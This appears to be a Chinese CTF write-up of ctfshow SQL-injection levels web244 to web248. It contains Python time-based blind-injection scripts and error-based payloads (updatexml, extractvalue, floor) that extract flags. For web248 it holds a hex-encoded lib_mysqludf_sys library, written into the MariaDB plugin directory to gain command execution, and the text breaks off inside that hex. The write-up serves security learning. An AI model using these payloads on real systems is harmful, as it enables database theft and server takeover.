src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-27164204.png" alt="2024-09-27164204"></p><h2 id="web244"><a class="markdownIt-Anchor" href="#web244"></a> web244</h2><p>error报错注入，先简单的进行一下测试注入，是get进行传参，有sleep可以成功，先看看前面的脚本能不能正常使用，进行简单的微调是可以得到flag的，也是时间等一等</p><h3 id="0x01-17"><a class="markdownIt-Anchor" href="#0x01-17"></a> 0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://414d893d-2ded-40da-9e5f-cb54d1dcb9a6.challenge.ctf.show/api/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;1&#x27; or if(substr((select flag from ctfshow_flag),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.1),0)#&quot;</span><br><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="0x02-17"><a class="markdownIt-Anchor" href="#0x02-17"></a> 0x02</h3><p>利用报错注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;)),0x7e))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>ctfshow_flag<span class="hljs-string">&#x27;)),0x7e))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select updatexml(1,concat(0x7e,(select flag from ctfshow_flag)),0x7e))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or(select updatexml(1,concat(0x7e,substring((select flag from ctfshow_flag),1),0x7e),0x7e))%23</span><br></code></pre></td></tr></table></figure><p>最后一步是因为第四步不能直接爆出所有的字符，需要微调一下内容，改动1那个位置</p><h3 id="0x03-3"><a class="markdownIt-Anchor" href="#0x03-3"></a> 0x03</h3><p>懒得写了，布尔盲注也是可以用的，而且应该比时间盲注快一点</p><hr><h2 id="web245"><a class="markdownIt-Anchor" href="#web245"></a> web245</h2><p>先盲注脚本跑看看</p><h3 id="0x01-18"><a class="markdownIt-Anchor" href="#0x01-18"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">import time<br>import requests<br><br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://e7e68c52-a18f-469f-b68e-3e790007590b.challenge.ctf.show/api/&#x27;</span><br><br>def get_flag_char(index):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-string">&quot;id&quot;</span>: f<span class="hljs-string">&quot;1&#x27; or if(substr((select flag1 from ctfshow_flagsa),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br><br>        &#125;<br>        try:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= 0.5:<br>                <span class="hljs-built_in">return</span> char<br>        except requests.RequestException as e:<br>            <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;请求失败: &#123;e&#125;&quot;</span>)<br>    <span class="hljs-built_in">return</span> None<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 64):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;当前情况: &#123;flag&#125;&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-built_in">break</span><br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;最终情况: &#123;flag&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="0x02-18"><a class="markdownIt-Anchor" href="#0x02-18"></a> 0x02</h3><p>过滤了updatexml,但是extractvalue还是可以正常使用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()))))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>ctfshow_flagsa<span class="hljs-string">&#x27;))))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select extractvalue(1,concat(0x7e,substring((select flag1 from ctfshow_flagsa),-10))))%23</span><br></code></pre></td></tr></table></figure><p>最后一步也是一样需要微调拼接</p><h2 id="web246"><a class="markdownIt-Anchor" href="#web246"></a> web246</h2><p>先看看盲注</p><h3 id="0x01-19"><a class="markdownIt-Anchor" href="#0x01-19"></a> 0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://2d7a2d28-52c4-4c83-90c5-1b8381016399.challenge.ctf.show/api/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;1&#x27; or if(substr((select flag2 from ctfshow_flags),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.1),0)#&quot;</span><br><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="0x02-19"><a class="markdownIt-Anchor" href="#0x02-19"></a> 0x02</h3><p>floor注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span>=1%27union+<span class="hljs-keyword">select</span>+1,count(*),concat((select+flag2+from+ctfshow_flags),<span class="hljs-number">0</span>x7e,floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))a+from+ctfshow_user+group+by+a--%20<br></code></pre></td></tr></table></figure><p>直接抄的wp，原理基本一致吧</p><h2 id="web247"><a class="markdownIt-Anchor" href="#web247"></a> web247</h2><p>再上题的基础上过滤了floor，继续盲注</p><h3 id="0x01-20"><a class="markdownIt-Anchor" href="#0x01-20"></a> 0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,?&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://04452d8b-ead5-40c6-be43-a04620fe4583.challenge.ctf.show/api/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;1&#x27; or if(substr((SELECT `flag?` FROM ctfshow_flagsa),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.1),0)#&quot;</span><br><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>需要注意的是由于有问号，所以需要加反引号</p><h3 id="0x02-20"><a class="markdownIt-Anchor" href="#0x02-20"></a> 0x02</h3><p>报错注入可以看网上wp不多赘叙</p><h2 id="web248"><a class="markdownIt-Anchor" href="#web248"></a> web248</h2><p>这方面是知识盲区了，学一下吧</p><p>udf 全称为：user defined function，意为用户自定义函数；用户可以添加自定义的新函数到 Mysql 中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。udf 文件后缀一般为 dll，由 C、C++ 编写。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;;select version();%23</span><br></code></pre></td></tr></table></figure><p>查看版本，大于5.1版本，继续查 plugin 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select @@plugin_dir;%23</span><br></code></pre></td></tr></table></figure><p>得到路径为：/usr/lib/mariadb/plugin/</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select &#x27;</span>7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803<span class="hljs-string">&#x27; into dumpfile &#x27;</span>/usr/lib/mariadb/plugin/1.txt<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select load_file(&#x27;</span>/usr/lib/mariadb/plugin/1.txt<span class="hljs-string">&#x27;)%23</span><br></code></pre></td></tr></table></figure><p>进行查看，然后导入第二部分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/api/?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;;select &#x27;</span>000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff0100000000000000000000001400